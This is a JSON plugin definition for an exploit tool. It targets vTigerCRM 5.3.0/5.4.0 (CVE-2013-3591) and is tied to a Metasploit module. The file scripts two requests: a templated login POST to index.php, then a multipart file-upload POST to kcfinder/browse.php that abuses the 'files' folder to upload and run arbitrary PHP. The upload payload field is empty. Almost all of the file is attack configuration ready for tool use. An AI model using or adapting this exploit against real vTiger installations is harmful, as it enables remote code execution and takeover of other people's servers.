{
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "path" : "kcfinder/browse.php?type=files&lng=en&act=upload?",
   "type" : "MSF",
   "informations" : {
      "TITLE" : "vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution",
      "CVE" : "CVE-2013-3591",
      "PAYLOAD" : "",
      "name" : "VtigerPhpExec",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "index.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PAYLOAD" : "module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=__USERNAME__&user_password=__PASSWORD__",
            "HEADERS" : {
               "Cookie" : "",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /index.php"
         },
         "EXPLOIT2" : {
            "METHOD" : "POST",
            "PATH" : "kcfinder/browse.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PAYLOAD" : "",
            "HEADERS" : {
               "Cookie" : "",
               "Content-Type" : "multipart/form-data; boundary=_Part_383_2713744736_2893190289"
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /kcfinder/browse.php"
         }
      },
      "DESCRIPTION" : "\n\n      vTiger CRM allows an authenticated user to upload files to embed within documents.\n\n      Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP\n\n      script and execute arbitrary PHP code remotely.\n\n\n\n      This module was tested against vTiger CRM v5.4.0 and v5.3.0.\n\n      ",
      "MSF_MODULE" : "vtiger_php_exec",
      "REFERENCES" : [
         "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats"
      ],
      "PATHS" : [
         "kcfinder/browse.php?type=files&lng=en&act=upload"
      ],
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "METHOD" : "POST",
      "PATH" : "kcfinder/browse.php?type=files&lng=en&act=upload?"
   },
   "detection" : {},
   "title" : "vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution",
   "payload" : "",
   "description" : "\n\n      vTiger CRM allows an authenticated user to upload files to embed within documents.\n\n      Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP\n\n      script and execute arbitrary PHP code remotely.\n\n\n\n      This module was tested against vTiger CRM v5.4.0 and v5.3.0.\n\n      ",
   "method" : "POST",
   "platform" : "MULTI",
   "paths" : [
      "kcfinder/browse.php?type=files&lng=en&act=upload"
   ],
   "requests" : {
      "EXPLOIT2" : {
         "METHOD" : "POST",
         "PATH" : "kcfinder/browse.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PAYLOAD" : "",
         "HEADERS" : {
            "Cookie" : "",
            "Content-Type" : "multipart/form-data; boundary=_Part_383_2713744736_2893190289"
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /kcfinder/browse.php"
      },
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "index.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PAYLOAD" : "module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=__USERNAME__&user_password=__PASSWORD__",
         "HEADERS" : {
            "Cookie" : "",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /index.php"
      }
   },
   "msf_module" : "vtiger_php_exec",
   "references" : [
      "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats"
   ],
   "cve" : "CVE-2013-3591",
   "name" : "VtigerPhpExec"
}
